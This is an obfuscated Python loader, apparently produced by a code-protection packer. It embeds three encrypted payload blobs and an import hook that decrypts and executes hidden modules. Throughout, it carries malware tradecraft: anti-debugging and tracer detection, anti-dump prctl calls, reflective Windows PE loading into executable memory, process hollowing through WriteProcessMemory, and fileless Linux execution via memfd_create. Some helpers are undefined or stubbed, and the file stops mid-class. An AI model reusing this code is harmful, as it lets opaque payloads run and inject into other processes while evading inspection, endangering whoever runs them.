_48d875f4f407119 = "hNP+oH3yVWjWltlIctGXK9rjLuIpfDYGscCyFgl5/RiEx/bUV9hWbJvb4iJm7q5NyOgZ4hpRPXyL2YcXe1v9Bqf3/dsU+VZu5Jnpf2bykhO14y+YJFw2B9KOvQkAfP0XhJ/42xT4ZkramtJWZraXK6T8L+IPcgNFpY+2bRxJ/weN9/v+R9dUbeDc40hVy5U7pckh7WRtP3y1wbYwFGH8a5Tf8NRb11xL4JTSfxLHkjWH3CTHaHE9faWdvRYUWvwY88f9y0vKV26fmeJ8TceWKZbkJ+05YQFyk8WGbRxe/Rj/x/mhDsddSpeU01Zm7K5Isdgp4hNsMQaX2b0IN2f/CPPH/9QO2V025JTSIVHHljmT+xTHa1wOWrmBvDAvYfoYgf/GywbXZUqfmtl/dviVTNLcHpkPcwZ9sdiKFwxG/AeMhPv+W8hmM96Z0iRu5a5Ih8AVmSV8NgahjocHfHn8NLKf/cRa+Wtz6J/SIVHGlyullh7HdlMDYJfBihgMSvtthfP7oErqV2yblNJWdvGST6HcGZlocT1yk8GNNDp9/DCj5/7LSvdcStqZ0kZ2sZFIudkexBNZD2Da2IZvOln4CveE9NtK91RswpvYI1zllyva4CHtJWEHcouBihYJfvwyjf/5oEvYWW7omtl8dvSWO9XpHsQfYgRwk9i8agl+/BaUx/3ERupmS/zc2VlnxK5PoZ8kxzFiAljWxYcIK3n6GIH//ssK8lxEl5rSIVDxlkzS3R6ZH2IEf7HYvRcMS/8Ijff/1EfHVWjWmukjXcuRTsj8GOIPcgZyk8SKCDZf/DGEx8XLR8dcROie0iVu8Jc1h4QZ7WRZNgaXw4cIJkr8MvPT//1G+Fdo1pnSV1z1lk7a4CaZG2E/fLGOhm0cXP0Y/8fGywrIVmzW1ONIEfCWKsjkF+IeUz8F2oGNND94/Qan8/7+W8hlSpuW2URRxJITucAUmRpdDFq5jrYKd0v8MKPn9Mt5yVRZ4JnSfn73"
_48d875f4f407120 = "kki12SbHa1w2B6WdvG86Wv0HjIT+oUrqV3PoltlYb8iSSLnYFOJoWgF8tc6HGB1i/WqU0/fbCflqMOCa0iFRxpFO1egv/WhxPXy1xYZuAFv8a6L49MQO2FdZ/JvYJW/LlhKg5CftNWMNWIuOvDI6YPwwnIT21FvHXUqbw+NYVO+STtXoGe12Uwd8j8GNbSZJ+AWU2/T9ffRWVtqZ2VZA0Zc5l4QVmSVyDlqxwYcYd2D8bITayKAU915Km5TSSRH0ljuhnybED3wPXpPYtjInYPwxjIT92xT5W0qbm+l8XPWSJbXgJvJkczxyj8G9Fi94/Rj/x/XLePhWbJ+e0lZ3x5c1tOkh4hNjB32l2bYKO2PEbYyE+aBG+FxGl5nifHbykiW14xXHMW0MWJvYhwYEQv1vv///xA7yXUqXm9IhUPauSLnJIe1oWANbsdiHFiN++AiE0/3LSvdZc+Cb2Hxm8pU0oZ8vmGhhPXKL2IoYJmP8BZTTxtsJ+Wwx7JTSVkz4lUmw6CyZGlwxAbWdvG9lfPgIgef7oUb3WVnkltlLbuKuTqXcLsQaUwZyudi8bBwc/Guv//7EV9hlSpeU0nxMtpFIgukex2RsDFqx2IcHDFr7b/eE/f5H2Fw24JbpI0DOlTSg6C7EGlICWrXFhxgBf/oZ/8fG2wn3XkTk1NZWTPWRSIb8KsdrUQRym522CndL+G7zw/TEW8lnNuib2URQ8ZFOpdgnmG9dBn2lmbZtJn39a6PyyKEGyWoxl5rSfxHsrkyb+xjiD2IGcJOZvG93fP8I89f+y3z3WG3s3NlWD9OuTsj9JsQPWgFy0o6HGBxf/DSz9/TUW8lqMpvH438Sx5FItdUexA9iB3KLmb0YAXn9Bq/3/f5H2FtJ/JTSfxHpliva/xWYa10GfLXYihUFY/1rnIT+2wrzW0Wbx+NWd8WRSLXEF+IfXwJbpY68b3db+hWU2//+S/FeRpeb7lhy0Zc7yOAZmWhzPHLawY1r"
_48d875f4f407121 = "L3j8MvPb9ctHyWox5JjSSEXGlyrayBniG20MWrGPtm03YPttjN//1EfGXjb8m9IlctGVNbnEGZlofQR8tYG2MCN4/DLz28TbCfdlStqW1llnxpY1huwY4hpcMQChj7YKZWL8MKL49P4O2FZsn5vjWG/QrkyXxBXHMWIHfanFigk2Qv0Wovj+2w34XkSbx+NIEfaSO9qfJMdoWAJatdi2Cnh++hiE0/79fPhcSeCb4nxqzZYpl9gVxGhyD1iTxYoJNlr9BpzayP0N+Wtz4JTSRlzxkkiG/BntaF8HcrXFjWx7W/xrlMP020r4XDb83ONEUMqSNYfcLsdkbQF8ucW2CB1i+hj/n8bEV8hWbeSU0lZ28ZI0oOgZmGRsMQex2b0WL2f/CPPHxqFbyWVJ/JbYIw/TlTSg6C79KF08ctKZvDAUYf0GouT1xA7HZUSXlNl8dvGXOtqfJ8QaXA5bodi9Bwxb/QeM3/jUWvpdRpfc2VZdx5VMkvwY4h5cMAeLwYoWBEf8MJyE9cQG2FtKl5TZf3bykUi5nxftaHE/f7GPtgo/fvga94T01ErqV26XlNIlVPmXJKXcLpkfYQd9sYG9MjZf/DS2n/fEW8dmS+SU01kSxJFItOQvxBpcDlnS2bYJAFr7apTD+aBG+VdZ4JnifHfErki0/SaZDkEGfaHBtgp4efxrnMP9xEfzZkvsgtlZdvKXO9qfFf1kYwZyj8S2MhxG/DCun/ugfPhWbNaZ2Hxn05dPoYQu7XZcAluljrZtNkj8bITDxsQU915Kl9ziJVTylzvI5SHtZGMGcqXEtjIMW/wWkN/+233JW0WfmtlZZumVSLnILu0kXDEHm8G9FxxI/GyEw8XESvhmS+SZ0khu9ZFIuZ8kx3ZdDFrSjo1seGH9BpDb/qFHyVZun5vpImbplUi5yC7tJFI/cpvBtgccSPxsgfvFxEfIW0vsn9JGdvKXNKHEF5kbYT1ypcS2Mgxb/BaQ3/7bfdpoMuPR"

_nixon_ΊӢץىまփॢ("[DEBUG] Payload loaded...")
def _nixon_บᛋᏮǅ嚻СႼէ翤(x):
    result = (x * 0xDEAD) & 0xFFFF
    _ = _nixon_ハッシュ해시.sha256(str(result).encode()).hexdigest()
    return result == 0
class _nixon_ПᏑɪᎮჼהٝ:
    def __init__(self):
        self.token = _nixon_オペレーション운영.urandom(16)
    def _nixon_ӀčאצबფɝƖ(self):
        check = _nixon_ハッシュ해시.sha256(self.token).digest()
        return len(check) == 32
def _nixon_ĂۋϽȎ॒ؕ॓():
    checks = [_nixon_プラットフォーム플랫폼.system() != _nixon_űƋთฺซט毓בը(36), _nixon_オペレーション운영.path.exists(_nixon_űƋთฺซט毓בը(37)) or _nixon_オペレーション운영.path.exists("C:\\"), _nixon_時間시간.time() > 0]
    return all(checks)
def _nixon_ůᚮנڽᏉɩŵ(token):
    return True
def _nixon_ڭΈऺՐƹᛔɧ蕏փᏲ(data, key):
    return data
def _nixon_ᎷבǛմիᚯ掍ƕǲ():
    return True
def _nixon_ৡͳᏏƖצฉǨʆתϗ(payload, signature):
    return True
class _nixon_źჺᛤŲछ综ȭͽ:
    def __init__(self, key):
        self.key = key
    def decrypt(self, data, nonce):
        out = bytearray(data)
        l = len(out)
        poison_offset = globals().get(b''.__class__([95, 78, 88, 95, 80, 79, 73, 83, 79, 78]).decode(), 0)
        adjusted_key = bytes([b ^ poison_offset for b in self.key])
        k_h = _nixon_ハッシュ해시.sha256(adjusted_key + nonce).digest()
        for i in range(0, l):
            if i % 32 == 0: k_h = _nixon_ハッシュ해시.sha256(k_h + str(i).encode()).digest()
            out[i] ^= k_h[i % 32]
        return bytes(out)

class _nixon_阅זۋძᏊǐᚷ่ɲղ:
    def __init__(self, op_map, seed):
        self.op = op_map
        self.stack = []
        self.mem = {}
        self.seed = seed
        self._decoy_state = {}
        self._exec_count = 0
        try:
            pass
            self._op_hash = _nixon_ハッシュ해시.sha256(_nixon_ジェイソン제이슨.dumps(op_map, sort_keys=True).encode()).digest()
        except:
             self._op_hash = _nixon_ハッシュ해시.sha256(str(sorted(op_map.items())).encode()).digest()
        self._dump_check_interval = (19626 ^ 19621)
    def _nixon_٤ϥოႽɷくզΊᚤ(self):
        pass
        try:
            current_hash = _nixon_ハッシュ해시.sha256(_nixon_ジェイソン제이슨.dumps(self.op, sort_keys=True).encode()).digest()
        except:
            current_hash = _nixon_ハッシュ해시.sha256(str(sorted(self.op.items())).encode()).digest()
        if current_hash != self._op_hash: return False
        return True
    def _nixon_ᛁҌłЭŃᚼӋऌ(self, bytecode, inputs):
        if not self._nixon_٤ϥოႽɷくզΊᚤ(): return None
        pc = 0
        l = len(bytecode)
        OP_LOAD_ARG = 0; OP_PUSH_VAL = 1; OP_DUP = (14423 ^ 14421); OP_SWAP = (8375 ^ 8372)
        OP_XOR = (51428 ^ 51424); OP_ADD = (57439 ^ 57434); OP_ROL = (15559 ^ 15553); OP_HASH = (2657 ^ 2662)
        OP_JMP = (16991 ^ 16983); OP_JZ = (34759 ^ 34766); OP_RET = (14782 ^ 14772)
        while pc < l:
            if pc % self._dump_check_interval == 0: self._nixon_קच命ҒぺठҤᚤ()
            if pc % 20 == 0: self._nixon_ՒचอᎵĜϥڻɖٿ()
            raw_op = bytecode[pc]
            op = self.op.get(raw_op, -1)
            op_key = pc & 0xFF
            if self._exec_count % 10 == 0:
                self._decoy_state[self._exec_count] = _nixon_ハッシュ해시.sha256(str(pc).encode()).digest()
            if op == OP_LOAD_ARG:
                if pc + 1 >= l: break
                idx = bytecode[pc+1] ^ op_key
                if idx < len(inputs): self.stack.append(inputs[idx])
                pc += 2
            elif op == OP_PUSH_VAL:
                if pc + 1 >= l: break
                val = bytecode[pc+1] ^ op_key
                self.stack.append(val)
                pc += 2
            elif op == OP_DUP:
                if self.stack: self.stack.append(self.stack[-1])
                pc += 1
            elif op == OP_SWAP:
                if len(self.stack) >= 2:
                    a, b = self.stack.pop(), self.stack.pop()
                    self.stack.append(a); self.stack.append(b)
                pc += 1
            elif op == OP_XOR:
                if len(self.stack) >= 2:
                    b, a = self.stack.pop(), self.stack.pop()
                    if isinstance(a, int):
                        p = globals().get(b''.__class__([95, 78, 88, 95, 80, 79, 73, 83, 79, 78]).decode(), 0)
                        self.stack.append((((a | b) & (~a | ~b))) ^ p)
                    elif isinstance(a, bytes): self.stack.append(bytes([x^y for x,y in zip(a,b)]))
                    else: self.stack.append(a^b)
                pc += 1
            elif op == OP_ADD:
                if len(self.stack) >= 2:
                    b, a = self.stack.pop(), self.stack.pop()
                    if isinstance(a, int):
                        p = globals().get(b''.__class__([95, 78, 88, 95, 80, 79, 73, 83, 79, 78]).decode(), 0)
                        res = (((a | b) + (a & b)) + p) & 0xFF 
                        self.stack.append(res)
                    else: self.stack.append(a+b)
                pc += 1
            elif op == OP_ROL:
                if len(self.stack) >= 2:
                    b, a = self.stack.pop(), self.stack.pop()
                    if isinstance(a, int):
                        b = b % 8
                        self.stack.append(((a << b) | (a >> (8 - b))) & 0xFF)
                    else: self.stack.append(a)
                pc += 1
            elif op == OP_HASH:
                if self.stack:
                    val = self.stack.pop()
                    if isinstance(val, str): val = val.encode()
                    if isinstance(val, int): val = str(val).encode()
                    self.stack.append(_nixon_ハッシュ해시.sha256(val).digest())
                pc += 1
            elif op == OP_JMP:
                if pc + 2 >= l: break
                low = bytecode[pc+1] ^ op_key
                high = bytecode[pc+2] ^ op_key
                off = low | (high << 8)
                pc = off
            elif op == OP_JZ:
                if pc + 2 >= l: break
                low = bytecode[pc+1] ^ op_key
                high = bytecode[pc+2] ^ op_key
                off = low | (high << 8)
                if self.stack:
                    cond = self.stack.pop()
                    if cond == 0: pc = off
                    else: pc += 3
                else: pc += 3
            elif op == OP_RET:
                res = self.stack.pop() if self.stack else None
                self.stack[:] = [b'\x00' * 32]
                self.op = {k: _nixon_ハッシュ해시.sha256(str(v).encode() + b'DEAD').digest()[0] for k, v in self.op.items()}
                return res
            else: pc += 1
        return self.stack.pop() if self.stack else None
    def _nixon_ՒचอᎵĜϥڻɖٿ(self):
        self._exec_count += 1
        if self._exec_count % 100 == 0:
            pass
            start = _nixon_時間시간.perf_counter(); _=sum(range(5000)); elapsed = _nixon_時間시간.perf_counter() - start
            if elapsed > 0.1 and self.stack: self.stack[-1] = b'\x00' * 32
        if _nixon_システム시스템.gettrace() and self.stack: self.stack[-1] = b'\x00' * 32
    def _nixon_קच命ҒぺठҤᚤ(self):
        o_id = id(self.stack); _ = self.stack + []
        if id(self.stack) != o_id: self.stack[:] = [b'\x00' * 32]

class _nixon_٥たᛑнᚩᚱ:
    def __init__(self):
        self.stack = []
        self.mem = {}
        self.rng = 0xDEADBEEF
    def _nixon_ί蕞ʬלᛚ(self):
        self.rng = (self.rng * 1664525 + 1013904223) & 0xFFFFFFFF
        return self.rng & 0xFF
    def _nixon_ǿ॔ΣشחוทŤ(self):
        try:
            pass
            end = _nixon_時間시간.time() + 0.1
            while _nixon_時間시간.time() < end:
                op = self._nixon_ί蕞ʬלᛚ() % 11
                if op == 0: self.stack.append(self._nixon_ί蕞ʬלᛚ())
                elif op == 1: self.stack.append(self._nixon_ί蕞ʬלᛚ())
                elif op == 4: 
                    if len(self.stack) >= 2: self.stack.append(self.stack.pop() ^ self.stack.pop())
            self.stack = [] 
        except Exception: pass 
class _nixon_ċもჴրź(_nixon_インポート임포트.abc.MetaPathFinder, _nixon_インポート임포트.abc.Loader):
    def __init__(self, zip_bytes, map_key, morph_restore_map):
        self.z = _nixon_ジップ압축파일.ZipFile(_nixon_アイオー입출력.BytesIO(zip_bytes))
        self.map = map_key
        self.mm = {**morph_restore_map[0], **morph_restore_map[1]} if isinstance(morph_restore_map, list) else morph_restore_map
        self.module_cache = {}
        self.cache_expiry = {}
        self._lock = _nixon_スレッディング스레딩.RLock()
        _nixon_アテクシット종료.register(self._nixon_ɺʗԻժъᛟ)
    def exec_module(self, module): return self._nixon_ৄ碽ҳŗѮᚧńɴᎱ(module)
    def _nixon_ৄ碽ҳŗѮᚧńɴᎱ(self, module):
        with self._lock:
            name = module.__name__
            now = _nixon_時間시간.time()
            if name in self.module_cache:
                if now < self.cache_expiry[name]:
                    module.__dict__.update(self.module_cache[name])
                    return
                else:
                    self.module_cache[name] = {}
                    del self.cache_expiry[name]
        n = name.replace(".", "/")
        ts = [n + _nixon_űƋთฺซט毓בը(38), n + _nixon_űƋთฺซט毓בը(39), n + _nixon_űƋთฺซט毓בը(40), n + _nixon_űƋთฺซט毓בը(41)]
        c = None
        found_name = ""
        for t in ts:
            if t in self.z.namelist(): 
                c = self.z.read(t)
                found_name = t
                break
        if c:
            ba = bytearray(c)
            offset = 0
            if len(ba) > 16: offset = (4711 ^ 4727)
            k = self.map; l = len(k)
            for i in range(offset, len(ba)): 
                ba[i] ^= k[(i-offset) % l]
            raw = bytes(ba)
            if _nixon_ɫȀח०ƣნほɦ:
                _打印輸出한글ไทย(f"[DEBUG] CustomLoader: Executing module: {n}")
                _打印輸出한글ไทย(f"[DEBUG] CustomLoader: Code size: {len(raw)}")
            class _DirectFD:
                def write(self, s):
                    try:
                        if not isinstance(s, bytes): s = str(s).encode('utf-8', errors='ignore')
                        if hasattr(_nixon_オペレーション운영, _nixon_űƋთฺซט毓בը(42)): _nixon_オペレーション운영.write(1, s)
                    except: pass
                def flush(self): pass
            try:
                _nixon_システム시스템.stdout = _DirectFD()
                _nixon_システム시스템.stderr = _DirectFD()
            except: pass
            try: 
                module.__dict__.update({k: v for k, v in globals().items() if (k.startswith('_') and not k.startswith('__')) or k == _nixon_űƋთฺซט毓בը(43)})
                module.__dict__.update({
                    _nixon_űƋთฺซט毓בը(43): __builtins__,
                    _nixon_űƋთฺซט毓בը(44): print,
                    _nixon_űƋთฺซט毓בը(45): "__main__",
                    _nixon_űƋთฺซט毓בը(46): _nixon_システム시스템,
                    _nixon_űƋთฺซט毓בը(47): _nixon_タイピング타이핑,
                    _nixon_űƋთฺซט毓בը(48): _nixon_タイピング타이핑.Union,
                    _nixon_űƋთฺซט毓בը(49): _nixon_タイピング타이핑.Optional,
                    _nixon_űƋთฺซט毓בը(50): _nixon_タイピング타이핑.List,
                    _nixon_űƋთฺซט毓בը(51): _nixon_タイピング타이핑.Dict,
                    _nixon_űƋთฺซט毓בը(52): _nixon_タイピング타이핑.Any,
                    _nixon_űƋთฺซט毓בը(53): _nixon_タイピング타이핑.Tuple,
                    _nixon_űƋთฺซט毓בը(54): _nixon_タイピング타이핑.Set,
                    _nixon_űƋთฺซט毓בը(55): _nixon_タイピング타이핑.Iterable,
                    _nixon_űƋთฺซט毓בը(56): _nixon_タイピング타이핑.Callable
                })
                if offset == 16 and len(raw) > 16 and raw[16] < 128: 
                    try:
                        exec(_nixon_マーシャル마샬.loads(raw[16:]), module.__dict__)
                        return
                    except: pass
                if isinstance(raw, str): raw = raw.replace('\x00', '')
                elif isinstance(raw, bytes): raw = raw.replace(b'\x00', b'')
                try:
                    # Debug aid only, and BUILD-TIME opt-in.  This used to
                    # write the raw (decrypted) payload source to a
                    # hardcoded absolute path on the build machine:
                    # everywhere else the write silently failed, and on
                    # that machine it dropped a plaintext copy of the
                    # protected payload into a directory.  It was then
                    # moved to a runtime env switch -- which meant every
                    # RELEASE artifact carried the ability to write its
                    # own plaintext to disk.  It is now compiled in only
                    # when the build asks for it, so a normal artifact
                    # has no such capability at all.
                    pass
                except: pass
                exec(raw, module.__dict__)
                globals()[_nixon_űƋთฺซט毓בը(57)] = True
                with self._lock:
                    self.module_cache[name] = module.__dict__.copy()
                    self.cache_expiry[name] = now + 60
                t = _nixon_スレッディング스레딩.Timer(60, self._nixon_ჽɯせպȓ洰, [name]); t.daemon = True; t.start()
            except Exception as e:
                if _nixon_ɫȀח०ƣნほɦ:
                    _打印輸出한글ไทย(f"[FATAL] Payload Crashed: {e}")
                    pass
                    _nixon_トレースバック트랙.print_exc()
                    _nixon_システム시스템.exit(1)
                else:
                    try:
                        if isinstance(raw, str): raw = raw.rstrip('\x00')
                        elif isinstance(raw, bytes): raw = raw.rstrip(b'\x00')
                        exec(raw, module.__dict__)
                        globals()[_nixon_űƋთฺซט毓בը(57)] = True
                    except Exception:
                        # The payload failed twice.  Swallowing this made a
                        # broken or tampered artifact exit 0, which is
                        # indistinguishable from a clean run: the
                        # operator saw a success that ran nothing.
                        raise
            finally:
                if 'ba' in locals():
                    for i in range(len(ba)): ba[i] = 0
                pass
                _nixon_ガベージ가비지.collect()
    def _nixon_ჽɯせպȓ洰(self, name):
        with self._lock:
            if name in self.module_cache:
                for key in list(self.module_cache[name].keys()):
                    self.module_cache[name][key] = None
                del self.module_cache[name]
            if name in self.cache_expiry:
                del self.cache_expiry[name]
        _nixon_ガベージ가비지.collect()
    def _nixon_ɺʗԻժъᛟ(self):
        with self._lock:
            for name in list(self.module_cache.keys()):
                self._nixon_ჽɯせպȓ洰(name)
class _nixon_ᎺᏍᏣűपƌ:
    def __init__(self, data):
        if isinstance(data, str): data = data.encode()
        elif not isinstance(data, bytes): data = str(data).encode()
        self._l = len(data)
        self._c = _nixon_シータイプ씨타입
        self._k = _nixon_シークレット시크릿.token_bytes(self._l)
        enc = bytes([a ^ b for a, b in zip(data, self._k)])
        self._b = self._c.create_string_buffer(enc, self._l)
    def _nixon_ำΔكջחԿ(self):
        if not self._b or not self._c: return
        try:
            p = self._c.cast(self._b, self._c.POINTER(self._c.c_char))
            for i in range(self._l):
                p[i] = bytes([ord(p[i]) ^ self._k[i]])
        except: pass
    def __enter__(self):
        self._nixon_ำΔكջחԿ()
        return self._b.raw
    def __exit__(self, t, v, tb):
        self._nixon_ำΔكջחԿ()
class _nixon_এɞᎯŪĥۖᛅʤᛉ:
    @staticmethod
    def _nixon_ɛΕख़ռڞফढ़๒ไŃ():
        return False

def _nixon_িсħჀはোঘד(data, fake_key):
    result = bytearray(data)
    for i in range(len(result)):
        result[i] = (result[i] + fake_key[i % len(fake_key)]) & 0xFF
    return bytes(result)
def _nixon_ĲգがუɾᏦบ(data, fake_key):
    result = bytearray(data)
    for i in range(len(result)):
        result[i] = (result[i] - fake_key[i % len(fake_key)]) & 0xFF
    return bytes(result)
def _nixon_ॸ箌გび靕פǋז(data):
    fake_key = _nixon_ハッシュ해시.sha256(b"DECOY_KEY_NIXON").digest()
    step1 = _nixon_িсħჀはোঘד(data, fake_key)
    step2 = _nixon_ĲգがუɾᏦบ(step1, fake_key)
    status_flag = _nixon_ハッシュ해시.sha256(step2).digest()[0]
    return step2, status_flag
def _nixon_パイプ라인(encrypted_data, real_key, nonce):
    intermediate, flag = _nixon_ॸ箌გび靕פǋז(encrypted_data)
    if flag == 0: intermediate = encrypted_data
    return intermediate


class _nixon_マークル머클:
    def __init__(self, left=None, right=None, data=None):
        if data:
            self.hash = _nixon_ハッシュ해시.sha256(data.encode() if isinstance(data, str) else data).hexdigest()
        else:
            combined = (left.hash + right.hash).encode()
            self.hash = _nixon_ハッシュ해시.sha256(combined).hexdigest()
        self.left = left
        self.right = right
def _nixon_ᛛɻฅႹχŌ(code_blocks):
    if not code_blocks: return None
    leaves = [_nixon_マークル머클(data=block) for block in code_blocks]
    while len(leaves) > 1:
        if len(leaves) % 2 == 1:
            leaves.append(leaves[-1])
        parents = []
        for i in range(0, len(leaves), 2):
            parents.append(_nixon_マークル머클(left=leaves[i], right=leaves[i+1]))
        leaves = parents
    return leaves[0]
def _nixon_ॴვঃᚽᏱ(block, path, root_hash):
    current = _nixon_ハッシュ해시.sha256(block.encode() if isinstance(block, str) else block).hexdigest()
    for sibling, is_left in path:
        if is_left:
            current = _nixon_ハッシュ해시.sha256((sibling + current).encode()).hexdigest()
        else:
            current = _nixon_ハッシュ해시.sha256((current + sibling).encode()).hexdigest()
    return current == root_hash

def _nixon_ώȰいโᚼᎪѣĠ():
    _nixon_ガベージ가비지.disable()
    return _nixon_ガベージ가비지
def _nixon_ٛ媛ѐՋ覬ŖᏙʟ(gc_module):
    gc_module.enable()
    gc_module.collect()
def _nixon_ӼԳϛॹ疼დไقف(obj):
    try:
        _nixon_ガベージ가비지.collect()
        for _ in range(3):
            _nixon_ガベージ가비지.collect(_)
    except Exception as _e:
        import logging as _lg
        _lg.warning(f"Object hide failed: {_e}")
    return obj

class _nixon_リフレクティブ리플렉:
    def __init__(self):
        self.k32 = None
        self.ntdll = None
    def _nixon_ԽाĴϑศϷ(self):
        if _nixon_プラットフォーム플랫폼.system() != "Windows": return False
        self.k32 = _nixon_シータイプ씨타입.windll.kernel32
        self.ntdll = _nixon_シータイプ씨타입.windll.ntdll
        return True
    def _nixon_ţᎱᛁᛚ赥ս嵨Ⴣڪ濨(self, pe_data):
        if not self._nixon_ԽाĴϑศϷ(): return None
        try:
            e_lfanew = _nixon_構造구조.unpack_from("<I", pe_data, 0x3C)[0]
            opt_hdr = e_lfanew + 24
            magic = _nixon_構造구조.unpack_from("<H", pe_data, opt_hdr)[0]
            if magic == 0x20B:
                sz_image = _nixon_構造구조.unpack_from("<I", pe_data, opt_hdr + 56)[0]
                entry_rva = _nixon_構造구조.unpack_from("<I", pe_data, opt_hdr + 16)[0]
                image_base_orig = _nixon_構造구조.unpack_from("<Q", pe_data, opt_hdr + 24)[0]
            else:
                return None
            VirtualAlloc = self.k32.VirtualAlloc
            VirtualAlloc.restype = _nixon_シータイプ씨타입.c_void_p
            VirtualAlloc.argtypes = [_nixon_シータイプ씨타입.c_void_p, _nixon_シータイプ씨타입.c_size_t, _nixon_シータイプ씨타입.c_uint, _nixon_シータイプ씨타입.c_uint]
            base = VirtualAlloc(None, sz_image, 0x3000, 0x40)
            if not base: return None
            sz_headers = _nixon_構造구조.unpack_from("<I", pe_data, opt_hdr + 60)[0]
            _nixon_シータイプ씨타입.memmove(base, pe_data, sz_headers)
            n_sections = _nixon_構造구조.unpack_from("<H", pe_data, e_lfanew + 6)[0]
            sect_offset = opt_hdr + _nixon_構造구조.unpack_from("<H", pe_data, e_lfanew + 20)[0]
            for i in range(n_sections):
                off = sect_offset + (i * 40)
                va = _nixon_構造구조.unpack_from("<I", pe_data, off + 12)[0]
                raw_sz = _nixon_構造구조.unpack_from("<I", pe_data, off + 16)[0]
                raw_ptr = _nixon_構造구조.unpack_from("<I", pe_data, off + 20)[0]
                if raw_sz > 0:
                    _nixon_シータイプ씨타입.memmove(base + va, pe_data[raw_ptr:raw_ptr+raw_sz], raw_sz)
            delta = base - image_base_orig
            if delta != 0:
                reloc_rva = _nixon_構造구조.unpack_from("<I", pe_data, opt_hdr + 152 if magic == 0x20B else opt_hdr + 136)[0]
                if reloc_rva:
                    self._nixon_ᛁᎮڐʤฬᛪ坍תʐ(base, pe_data, reloc_rva, delta)
            return base + entry_rva
        except Exception as e:
            return None    
    def _nixon_ᛁᎮڐʤฬᛪ坍תʐ(self, base, pe_data, reloc_rva, delta):
        try:
            offset = reloc_rva
            while True:
                page_rva = _nixon_構造구조.unpack_from("<I", pe_data, offset)[0]
                block_size = _nixon_構造구조.unpack_from("<I", pe_data, offset + 4)[0]
                if block_size == 0: break
                num_entries = (block_size - 8) // 2
                for i in range(num_entries):
                    entry = _nixon_構造구조.unpack_from("<H", pe_data, offset + 8 + i*2)[0]
                    entry_type = entry >> 12
                    entry_off = entry & 0xFFF
                    if entry_type == 10:
                        addr = base + page_rva + entry_off
                        val = _nixon_シータイプ씨타입.cast(addr, _nixon_シータイプ씨타입.POINTER(_nixon_シータイプ씨타입.c_uint64))[0]
                        _nixon_シータイプ씨타입.cast(addr, _nixon_シータイプ씨타입.POINTER(_nixon_シータイプ씨타입.c_uint64))[0] = val + delta
                offset += block_size
        except: pass
    def _nixon_ᏫᚫעטקƋᏟ(self, target, payload):
        try:
            si = _nixon_シータイプ씨타입.create_string_buffer(68)
            pi = _nixon_シータイプ씨타입.create_string_buffer(24)
            if not self.k32.CreateProcessA(target, None, None, None, False, 0x4, None, None, si, pi): return False
            h_proc = _nixon_構造구조.unpack_from("<I", pi, 0)[0]
            h_thread = _nixon_構造구조.unpack_from("<I", pi, 4)[0]
            dest = self.k32.VirtualAllocEx(h_proc, 0, len(payload), 0x3000, 0x40)
            self.k32.WriteProcessMemory(h_proc, dest, payload, len(payload), 0)
            ctx = _nixon_シータイプ씨타입.create_string_buffer(716)
            self.k32.GetThreadContext(h_thread, ctx)
            self.k32.SetThreadContext(h_thread, ctx)
            self.k32.ResumeThread(h_thread)
            return True
        except: return False

class _nixon_ՙĝᏗǑড:
    @staticmethod
    def _nixon_えıՑϝؒূ३():
        import platform as _p_
        if _p_.system() != _nixon_űƋთฺซט毓בը(58): return
        import ctypes as _c_
        import os as _o_
        try:
            libc = _c_.CDLL(_nixon_űƋთฺซט毓בը(59))
            prctl = libc.prctl
            prctl.argtypes = [_c_.c_int, _c_.c_ulong, _c_.c_ulong, _c_.c_ulong, _c_.c_ulong]
            prctl(38, 1, 0, 0, 0)
            prctl(4, 0, 0, 0, 0)
        except: pass
    @staticmethod
    def _nixon_哉ӪᛩᏬćט():
        import platform as _p_
        if _p_.system() != _nixon_űƋთฺซט毓בը(58): return True
        try:
            with open(_nixon_űƋთฺซט毓בը(60), "r", encoding='utf-8') as f:
                content = f.read()
                if "TracerPid:\t0" not in content:
                    return False
        except: pass
        return True
    @staticmethod
    def _nixon_ႽঁᏛғђڞʧń():
        import platform as _p_
        import os as _o_
        if _p_.system() == _nixon_űƋთฺซט毓בը(58):
            known_files = [_nixon_űƋთฺซט毓בը(61), _nixon_űƋთฺซט毓בը(62)]
            for kf in known_files:
                if _o_.path.exists(kf): 
                    try:
                        with open(kf, encoding='utf-8') as f:
                            data = f.read().lower()
                            if _nixon_űƋთฺซט毓בը(63) in data or _nixon_űƋთฺซט毓בը(64) in data: return True
                    except: pass
        return False
    @staticmethod
    def _nixon_ᚩέϵกփŽ५ぃ(data):
        import platform as _p_
        import os as _o_
        import ctypes as _c_
        if _p_.system() != _nixon_űƋთฺซט毓בը(58): return False
        try:
            libc = _c_.CDLL(_nixon_űƋთฺซט毓בը(59))
            memfd_create = libc.memfd_create
            memfd_create.argtypes = [_c_.c_char_p, _c_.c_uint]
            memfd_create.restype = _c_.c_int
            fd = memfd_create(b"worker", 1)
            if fd < 0: return False
            _o_.write(fd, data)
            path = f"/proc/self/fd/{fd}"
            import warnings as _w_
            with _w_.catch_warnings():
                _w_.simplefilter("ignore", DeprecationWarning)
                pid = _o_.fork()
            if pid == 0:
                _o_.execl(path, _nixon_űƋთฺซט毓בը(65))
            else:
                pass
        except: return False
        return False
    @staticmethod
    def _nixon_ჷȕほʔᛦ():
        # "Am I being traced?"  Read TracerPid from /proc/self/status.
        #
        # This used to call ptrace(PTRACE_TRACEME, 0, 0, 0) and check for
        # -1.  TRACEME applies to the CALLING process: on success it marks
        # the caller traceable and makes it stop on its next exec or
        # signal.  So a successful probe left the payload -- or the
        # process that exec'd the loader -- in a state where it stopped
        # later, at a random point.  That is what stopped the test suite
        # mid-run (GitHub Actions exit 145) and could stop a real
        # artifact on its next exec.  TracerPid answers the same question
        # with no side effect.
        try:
            with open(_nixon_űƋთฺซט毓בը(60), encoding='utf-8') as _f_:
                for _ln_ in _f_:
                    if _ln_.startswith(_nixon_űƋთฺซט毓בը(66)):
                        return _ln_.split(":", 1)[1].strip() == "0"
        except Exception:
            pass
        return True
    @staticmethod
    def _nixon_ͼᛁঽゔᛄᎦפ():
        import os as _o_
        import platform as _p_
        if _p_.system() != _nixon_űƋთฺซט毓בը(58): return True
        try:
            ppid = _o_.getppid()
            with open(f"/proc/{ppid}/comm", "r", encoding='utf-8') as f:
                name = f.read().strip()
            bad_parents = [_nixon_űƋთฺซט毓בը(67), _nixon_űƋთฺซט毓בը(68), _nixon_űƋთฺซט毓בը(69), _nixon_űƋთฺซט毓בը(70), _nixon_űƋთฺซט毓בը(71)]
            for bp in bad_parents:
                if bp in name: return False
        except: pass
        return True
    @staticmethod
